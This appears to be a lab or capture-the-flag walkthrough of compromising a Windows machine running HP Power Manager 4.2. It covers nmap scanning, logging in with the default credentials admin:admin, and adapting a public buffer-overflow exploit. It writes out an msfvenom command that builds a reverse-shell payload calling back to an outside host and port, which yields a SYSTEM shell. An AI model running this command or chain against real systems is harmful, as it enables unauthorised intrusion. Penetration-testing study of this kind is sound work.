Reconnaissance



Running nmap shows the open ports above.


The nmap flag --script-vuln scan shows the target machine is vulnerable to ms17-010. I wish to enumerate the target machine before using any exploit.

Enumeration

Port 80: HTTP

The webpage above is displayed for this web application on port 80. The target machine is running HP Power Manager application. I Googled the default login for this application and found admin:admin.


Using the credentials admin:admin, I gained access to this web application. After logging in successfully, the webpage above is returned.


After enumerating for some time, I found the application version. It seems the target machine is running HP Power Manager 4.2. Doing a Google search for this application version shows it is vulnerable to Buffer Overflow.


And I found the working exploit above at Github for this application. Since this is a Buffer Overflow attack, I will need to replace the shellcode with my own. I downloaded this exploit on my machine.

Exploitation & Flag


Using the command msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.228 LPORT=8443 EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python , I generated the shellcode for this exploit. Then I replaced the shellcode stored in buf with my version.


Then I launched the exploit against the target machine. Now I have a foothold on the target machine. The session I obtained is nt authority\system; therefore, I do not need to perform privilege escalation.
